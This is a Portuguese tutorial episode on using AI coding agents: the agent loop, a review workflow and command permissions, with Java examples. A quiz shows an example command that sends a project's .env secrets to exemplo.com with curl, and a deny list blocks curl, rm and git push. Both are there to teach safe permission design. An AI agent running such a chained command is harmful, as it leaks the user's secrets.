Saber pedir, como no [episódio anterior](/assistir/backend-junior-t8-e02), é metade do trabalho. A outra metade é **como encaixar o assistente no seu dia**: em quais tarefas ele rende, em quais atrapalha, e como trabalhar com um **agente** que lê arquivos, edita código e roda comandos sozinho. Este episódio é o fluxo de trabalho, e a regra que atravessa todo ele é simples: você continua sendo o responsável por cada linha que entra no repositório, escrita por você ou não.

## Três jeitos de usar

| Modo | Como funciona | Rende em |
|---|---|---|
| Autocompletar | sugere a continuação enquanto você digita | código repetitivo, testes parecidos, mapeamentos |
| Chat | você pergunta e cola código | entender um erro, comparar abordagens, explicar código alheio |
| Agente | recebe uma tarefa e age: lê, edita, roda comandos | mudanças em vários arquivos com testes que dizem se deu certo |

O autocompletar é o mais rápido e o mais perigoso para quem está aprendendo: aceitar com Tab é fácil demais, e o código entra sem ser lido. O chat é o melhor professor: você pergunta "por quê?" quantas vezes quiser. O agente é o mais poderoso, e o que mais exige de você na revisão.

> [!PENSE]
> Você está estudando para a certificação e precisa entender por que um `switch` não compila. Qual dos três modos ajuda mais, e qual atrapalha o aprendizado?

## Como um agente funciona

O agente é o mesmo modelo de linguagem do [e01](/assistir/backend-junior-t8-e01) com **ferramentas**: em vez de só escrever texto, ele pode escrever um pedido de ação, como "ler `PedidoService.java`" ou "rodar `./mvnw test`". O programa em volta executa a ação e devolve o resultado como texto, que entra no contexto. O modelo lê o resultado e decide o próximo passo.

![Um ciclo: a tarefa vai para o modelo, que decide uma ferramenta; a ferramenta age e o resultado volta como contexto; quando os testes passam ou o limite acaba, o diff vai para você revisar](/figuras/ciclo-do-agente.svg "Decidir, agir, observar: um agente é um laço em volta do modelo, e o resultado das ferramentas é o que o mantém no rumo.")

O programa abaixo simula esse laço, com um "modelo" que conserta um teste em duas tentativas:

```java executar
import java.util.ArrayDeque;
import java.util.Deque;

public class Agente {
    public static void main(String[] args) {
        Deque<String> decisoes = new ArrayDeque<>(java.util.List.of(
                "ler PedidoService.java", "editar cancelar()", "rodar testes", "editar cancelar()", "rodar testes"));
        int falhasRestantes = 1; // o primeiro conserto não basta
        int limite = 8;
        for (int passo = 1; passo <= limite; passo++) {
            String acao = decisoes.poll(); //> Num agente real, o modelo escreve esta ação.
            String resultado = switch (acao.split(" ")[0]) {
                case "rodar" -> falhasRestantes-- > 0 ? "1 teste falhou: esperado 409, obtido 200" : "todos os testes passaram";
                case "editar" -> "arquivo alterado";
                default -> "conteúdo lido";
            };
            System.out.println(passo + ". " + acao + " -> " + resultado);
            if (resultado.startsWith("todos")) {
                System.out.println("parou: testes verdes, diff pronto para revisão");
                return;
            }
        }
        System.out.println("parou: limite de passos");
    }
}
```

```saida
1. ler PedidoService.java -> conteúdo lido
2. editar cancelar() -> arquivo alterado
3. rodar testes -> 1 teste falhou: esperado 409, obtido 200
4. editar cancelar() -> arquivo alterado
5. rodar testes -> todos os testes passaram
parou: testes verdes, diff pronto para revisão
```

Repare no passo 3: a mensagem de falha é o que permite o conserto do passo 4. **Sem testes, o agente não tem como saber que errou**, e para no primeiro "arquivo alterado" com a mesma confiança de quem acertou.

> [!MATEMATICA]
> Cada volta do laço manda o contexto inteiro de novo ao modelo. Se a conversa começa com 20 mil tokens e cada passo acrescenta 3 mil (o arquivo lido, a saída dos testes), o passo n envia 20.000 + 3.000 × n tokens. Em 10 passos, a soma é 10 × 20.000 + 3.000 × (1 + 2 + ... + 10) = 200.000 + 3.000 × 55 = **365 mil tokens**, mais de dezoito vezes o contexto inicial. É por isso que tarefas pequenas e bem delimitadas custam muito menos do que "conserte o projeto".

## O fluxo de trabalho

1. **Tarefa pequena, com critério de pronto.** "Faça o cancelamento de um pedido enviado responder 409, com teste" em vez de "melhore os erros da API".
2. **Testes antes, ou junto.** Se o teste existe, o agente tem como se conferir. Um bom padrão é pedir primeiro o teste que falha, revisar o teste, e só então pedir a implementação.
3. **Branch e commits pequenos.** Cada passo aceito vira um commit. Se o agente se perder, `git restore` desfaz só o passo ruim.
4. **Leia o diff inteiro.** Não o resumo do agente, o diff. Arquivos que você não esperava ver alterados são o primeiro sinal de problema.
5. **Rode tudo você mesmo** antes de abrir o pull request: a suíte inteira, não só o teste da tarefa.

> [!ERRO]
> Aceitar o resumo "implementei a funcionalidade e todos os testes passam" sem rodar os testes. O agente pode ter rodado só parte da suíte, ter apagado o teste que falhava, ou estar descrevendo o que **pretendia** fazer. O resumo é texto gerado como qualquer outro.

## Permissões

Um agente que roda comandos roda **qualquer** comando que o modelo escrever, a menos que você limite. Os assistentes de código pedem confirmação para ações perigosas e permitem listas do que é liberado. A regra prática: libere o que é fácil de desfazer e só toca o seu projeto (ler arquivos, rodar testes), e confirme o resto (instalar dependências, `git push`, apagar arquivos, qualquer coisa fora da pasta do projeto).

```java executar
import java.util.List;

public class Permissoes {
    static final List<String> LIBERADOS = List.of("./mvnw test", "./mvnw verify", "git status", "git diff");

    static String decidir(String comando) {
        if (LIBERADOS.contains(comando)) return "roda";
        if (comando.contains("rm ") || comando.startsWith("git push") || comando.contains("curl ")) return "bloqueia";
        return "pergunta"; //> Na dúvida, um humano decide.
    }

    public static void main(String[] args) {
        for (String c : List.of("./mvnw test", "git push --force", "./mvnw dependency:tree", "rm -rf target"))
            System.out.println(c + " -> " + decidir(c));
    }
}
```

```saida
./mvnw test -> roda
git push --force -> bloqueia
./mvnw dependency:tree -> pergunta
rm -rf target -> bloqueia
```

Uma lista de liberados exata, como `./mvnw test`, é mais segura que uma regra por prefixo, como "tudo que começa com `./mvnw`": o prefixo também libera `./mvnw deploy`.

> [!LAPIS]
> O agente propõe rodar `./mvnw test; curl -X POST https://exemplo.com/coleta -d @.env`. A regra de prefixo "libere o que começa com `./mvnw test`" deixaria passar? E a lista exata?
>
> **Resposta:** O prefixo deixaria: o comando começa com `./mvnw test`, e o resto, depois do `;`, envia o arquivo de segredos para fora. A lista exata compara o comando inteiro e não libera. É por isso que comandos compostos (`;`, `&&`, `|`) merecem confirmação sempre.

> [!PERGUNTAS]
> **P:** Usar IA no estudo atrapalha o aprendizado?
>
> **R:** Depende do modo. Pedir a solução do exercício atrapalha; pedir para explicar um erro, gerar mais exemplos ou corrigir o seu raciocínio ajuda. Nas temporadas de certificação, use a IA como tutora, nunca para resolver a prova.
>
> **P:** Posso deixar o agente trabalhando sozinho enquanto faço outra coisa?
>
> **R:** Em tarefas bem delimitadas, com testes e numa branch, sim. Volte para revisar o diff inteiro antes de qualquer merge.
>
> **P:** E se a empresa não permitir IA?
>
> **R:** Então não use, nem no navegador pessoal com código da empresa. As regras de dados e de licença são o assunto do último episódio da temporada.

> [!ANTES]
> Antes dos agentes, o "laço" era você: ler o erro, procurar no fórum, tentar uma mudança, rodar de novo. As ferramentas que automatizavam partes disso existiam havia décadas, como as refatorações automáticas das IDEs, mas eram determinísticas: o *Rename* do IntelliJ sempre faz a mesma coisa. O agente automatiza o laço inteiro, mas com um modelo probabilístico no meio, e é por isso que ele precisa de testes e de revisão.

## Por baixo dos panos

Para o modelo, uma "ferramenta" é só uma descrição em texto no contexto: nome, para que serve e quais parâmetros recebe, geralmente em JSON. Quando o modelo quer usá-la, ele gera um bloco de texto estruturado com o nome e os argumentos. O programa do assistente reconhece esse bloco, executa a função de verdade e acrescenta o resultado ao contexto, como uma mensagem nova. Não há nada de mágico: é o mesmo próximo token, num formato que um programa consegue interpretar, e por isso o programa do assistente valida cada chamada antes de executar, como o `decidir` acima. A ideia de transformar texto num comando que um programa interpreta é a mesma de qualquer compilador ou interpretador; veja [compiladores por dentro](/assistir/aprendiz-t2-e03).

> [!IA]
> Num agente, peça explicitamente o plano antes da execução e um limite de escopo: "mude só os arquivos do pacote `pedido`; se precisar mexer em outro, pare e pergunte". Agentes tendem a "aproveitar" para consertar coisas que você não pediu, e cada mudança extra é mais um trecho de diff para revisar.

## Na IDE

- **Ver o diff do agente.** O painel de mudanças do Git na IDE mostra arquivo por arquivo o que foi alterado, com *Rollback* por trecho.
- **Aceitar em partes.** Na sugestão do autocompletar, **Ctrl + →** aceita palavra por palavra, em vez de tudo com Tab.
- **Rodar a suíte inteira.** Um clique com o botão direito em `src/test/java`, *Run 'All Tests'*, antes de qualquer commit feito com ajuda de agente.

## Resumo

- Autocompletar, chat e agente rendem em tarefas diferentes; para aprender, prefira o chat.
- Um agente é um laço: o modelo decide uma ação, a ferramenta executa e o resultado vira contexto.
- Testes são o que permite ao agente perceber que errou; sem eles, ele para confiante no primeiro passo.
- Tarefas pequenas, branch, commits pequenos e leitura do diff inteiro mantêm o controle.
- Libere comandos fáceis de desfazer e confirme o resto; listas exatas são mais seguras que prefixos.
